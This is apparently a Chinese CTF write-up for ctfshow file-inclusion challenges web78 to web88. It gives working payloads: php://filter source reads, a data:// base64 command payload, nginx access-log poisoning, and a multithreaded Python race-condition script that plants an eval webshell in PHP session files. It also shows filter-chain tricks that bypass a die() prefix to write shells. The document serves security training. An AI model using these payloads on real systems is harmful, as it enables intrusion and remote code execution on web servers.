---
layout: post
title: ctfshow-文件包含
date: 2021-02-09
tags: ["web"]
---

[toc]

## web78

没有任何过滤，直接php伪协议读取。

    file=php://filter/convert.base64-encode/resource=flag.php

## web79

过滤了php，无法使用伪协议，考虑使用data协议直接写入文件。

    file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==

注：上面的base64为`file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==`的编码。

## web80

又过滤了data，也没有办法写入文件了。此时考虑包含日志文件，直接getshell
先随便访问一个网站目录下不存在的文件，发现服务器是nginx。
[![](http://ltfa1l.top/wp-content/uploads/2021/02/wp_editor_md_6e3aaca4e500823c5597bf60fad75274.jpg)](wp_editor_md_6e3aaca4e500823c5597bf60fad75274.jpg)
搜一下nginx的日志文件在哪里，发现是在`/var/log/nginx/access.log`
那么我们抓包，在user-agent里面添加一串php代码：
[![](http://ltfa1l.top/wp-content/uploads/2021/02/wp_editor_md_bfc673885bbd691f3e7218921eb9a391.jpg)](wp_editor_md_bfc673885bbd691f3e7218921eb9a391.jpg)
查看日志文件：
[![](http://ltfa1l.top/wp-content/uploads/2021/02/wp_editor_md_6a55d3b7fe5a9f0ec1315e21e4d4f627.jpg)](wp_editor_md_6a55d3b7fe5a9f0ec1315e21e4d4f627.jpg)
这样一来就知道要读取的是fl0g.php了。重复以上操作，读取fl0g.php即可得到flag。

## web81

同上

## web82-86

过滤了'.'，所以没有办法读取日志文件了。
看[这篇文章](https://www.freebuf.com/vuls/202819.html)，讲得很好。
总结一下我学到的思路：
首先是要包含一个文件，文件里面必须要有恶意代码。
因此我们上传一个文件。方法是：我们自己上传一个文件，然后利用上文中提到的，若upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中，值得注意的是session文件也是存放在服务器上的，一般存放在/tmp/session_+session_id这个文件上，因此我们在session中写入木马，然后包含这个文件就可以了。
但是如同上文中提到的，这个文件也是隔一段时间就会被删掉的，没有办法直接包含。
但是我们可以利用条件竞争：即我们在这个文件被删掉之前，开多线程同时读取和写入文件，从而达到包含这个文件的目的。
有的大佬们可以直接写脚本来做这个，但是我不是很会写这个脚本，因此把手动instruder的方法也写在了这里，后面再贴上脚本。
首先在vscode里面写这样的html：

    <html>
        <body>
            <form action="http://affcff0b-eae2-427d-af1f-26108f719048.chall.ctf.show:8080/" method="post" enctype="multipart/form-data">
                <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123"/>
                <input type="file" name="fileUpload"/>
                <input type="submit" value="上传文件">
            </form>
        </body>
    </html>

然后再解释一下这一段html代码：首先利用的是表单的上传文件。
注意两种Content-Type方式，其中multipart/form-data既可以上传文件等二进制数据，也可以上传表单键值对，最后转化成一条信息。
而x-www-form-urlencoded只能上传键值对，而且键值对都是间隔分开的，因此很明显我们选择multipart/form-data。
然后第一个input框，留给我们待会儿抓包修改的，注意就是name那个地方要填对，表明我们修改的是待会的session临时文件。
第二三个input框就是上传文件的。
然后把这个html在浏览器里面打开：
[![](http://ltfa1l.top/wp-content/uploads/2021/02/wp_editor_md_3a7c32d2186b1c32a42b4df39c958955.jpg)](wp_editor_md_3a7c32d2186b1c32a42b4df39c958955.jpg)
至于文件内容，随便，待会儿抓包了再改也行。
然后burp抓包这个上传的动作，直接放到instruder把，如图：
[![](http://ltfa1l.top/wp-content/uploads/2021/02/wp_editor_md_2338985d7116d4f1977912e98b15cdc9.jpg)](wp_editor_md_2338985d7116d4f1977912e98b15cdc9.jpg)
图里面的是我们要添加或者修改的，看好了。
首先cookie这里，这个session的id要和待会儿包含的文件名一致。
其次就是刚刚我们html里面写的那个value，给他加点无耻的php代码。
最后就是上传的那个文件，整大一些。
这就是我们上传的包，不急，不急着开始爆破，我们把包含文件的包写好之后两个一起爆破，就可以达到多线程的目的。
这是文件包含包：
[![](http://ltfa1l.top/wp-content/uploads/2021/02/wp_editor_md_df57c767908bf5de920a52b582d6d297.jpg)](wp_editor_md_df57c767908bf5de920a52b582d6d297.jpg)
一定要保证session_id是一样的。
两个包里面爆破的内容选的都是一些无关紧要的，然后两个包一起发，可以选大一点。
然后再文件包含的包里面就可以出flag了：
[![](http://ltfa1l.top/wp-content/uploads/2021/02/wp_editor_md_8d5c909665f5ec25cfbaef6895ac0366.jpg)](wp_editor_md_8d5c909665f5ec25cfbaef6895ac0366.jpg)
上面算是我自己能够理解的一个方法，下面我贴下大佬的脚本，原理是一样的，但是中间有一些细节我不是很懂，但是可以直接用：

    import io
    import requests
    import threading

    sessid = 'flag'
    data = {"cmd": "system('cat fl0g.php');"}
    url = "http://affcff0b-eae2-427d-af1f-26108f719048.chall.ctf.show:8080/"

    def write(session):
        while True:
            f = io.BytesIO(b'a' * 1024 * 50)
            resp = session.post(url,
                                data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php eval($_POST["cmd"]);?>'},
                                files={'file': ('tgao.txt', f)}, cookies={'PHPSESSID': sessid})

    def read(session):
        while True:
            resp = session.post(url+'?file=/tmp/sess_' + sessid,
                                data=data)
            if 'tgao.txt' in resp.text:
                print(resp.text)
                event.clear()
            else:
                pass

    if __name__ == "__main__":
        event = threading.Event()
        with requests.session() as session:
            for i in range(1, 30):
                threading.Thread(target=write, args=(session,)).start()

            for i in range(1, 30):
                threading.Thread(target=read, args=(session,)).start()
        event.set()

## web87

看题：
[![](http://ltfa1l.top/wp-content/uploads/2021/02/wp_editor_md_96922aa80cce4f14d8315bd8ee56b0d5.jpg)](wp_editor_md_96922aa80cce4f14d8315bd8ee56b0d5.jpg)
代码审计，发现最后一个file_put_contents是把前面的一个退出程序的php代码放在了content的前面，然后文件名经过url编码，因此前面的过滤基本没啥用。
很自然联想到[p神的文章](https://www.leavesongs.com/PENETRATION/php-filter-magic.html),绕过死亡exit。这里同理。

### 方法1 base64

用base64解码先绕过这个php代码。由于前面php代码`<?php die('大佬别秀了');?>`中只有phpdie六个字符是base64里面的字符，因此待会儿还得补充两个任意字符。然后传入编码后的木马：
[![](http://ltfa1l.top/wp-content/uploads/2021/02/wp_editor_md_389b5eb63cb5612d474f13f11485b6c0.jpg)](wp_editor_md_389b5eb63cb5612d474f13f11485b6c0.jpg)
因此content就是：
[![](http://ltfa1l.top/wp-content/uploads/2021/02/wp_editor_md_2755d5dff6da5235ffadd820b8ac62cc.jpg)](wp_editor_md_2755d5dff6da5235ffadd820b8ac62cc.jpg)
然后只需要在文件名处使用php过滤器就可以了。值得注意的是，url本身会解码一次，因此我们需要编码两次。
get处未经过url编码的payload为：

    file=php://filter/write=convert.base64-decode/resource=1.php

即将解码后的字符写入1.php。
url加密两次，传入file：
[![](http://ltfa1l.top/wp-content/uploads/2021/02/wp_editor_md_dad8d283c596392c51bb0b2c4df491b0.jpg)](wp_editor_md_dad8d283c596392c51bb0b2c4df491b0.jpg)
运行，访问网站目录下的1.php：
[![](http://ltfa1l.top/wp-content/uploads/2021/02/wp_editor_md_2515137a47b957d56cb5bb5778d89aa2.jpg)](wp_editor_md_2515137a47b957d56cb5bb5778d89aa2.jpg)
可以看到已经拿到了shell。上面的乱码明显是phpdie和我们加上的两个字符经过base64解码后的结果。

### 方法2 标签去除

前面的php代码实际上也是一段xml标签，所以我们可以先去除标签，然后再进行base64解码，这样就可以不用添加字符了。
[![](http://ltfa1l.top/wp-content/uploads/2021/02/wp_editor_md_198df6388516265afe44334d041500c8.jpg)](wp_editor_md_198df6388516265afe44334d041500c8.jpg)
编码写入content：
[![](http://ltfa1l.top/wp-content/uploads/2021/02/wp_editor_md_f32f3b73807ea5ab7775ba30173865a5.jpg)](wp_editor_md_f32f3b73807ea5ab7775ba30173865a5.jpg)
写入后访问2.php：
[![](http://ltfa1l.top/wp-content/uploads/2021/02/wp_editor_md_8afe7d9f72c08a9336ab063f3007cee6.jpg)](wp_editor_md_8afe7d9f72c08a9336ab063f3007cee6.jpg)
成功getshell.

### 方法3 rot13编码

在php过滤器里面编码写入的字符，前面的一段die的代码就会被编码，不会被执行。因此传入我们先解码一次的php代码：
[![](http://ltfa1l.top/wp-content/uploads/2021/02/wp_editor_md_d3026b6c13b0d26012f37caefe007884.jpg)](wp_editor_md_d3026b6c13b0d26012f37caefe007884.jpg)
然后照样，编码file:
[![](http://ltfa1l.top/wp-content/uploads/2021/02/wp_editor_md_e8d7207329ada490e56362861713cb02.jpg)](wp_editor_md_e8d7207329ada490e56362861713cb02.jpg)
然后写入文件：
[![](http://ltfa1l.top/wp-content/uploads/2021/02/wp_editor_md_ed7ddf7017f12d3f13886d2e93accdc2.jpg)](wp_editor_md_ed7ddf7017f12d3f13886d2e93accdc2.jpg)
成功getshell。

## web88

可以直接使用data流读取，然后由于过滤了=号，加空格直到没有=号即可。
[![](http://ltfa1l.top/wp-content/uploads/2021/02/wp_editor_md_2cd28a91624e20c932358c9ca7476f55.jpg)](wp_editor_md_2cd28a91624e20c932358c9ca7476f55.jpg)

## 后面的

暂时不会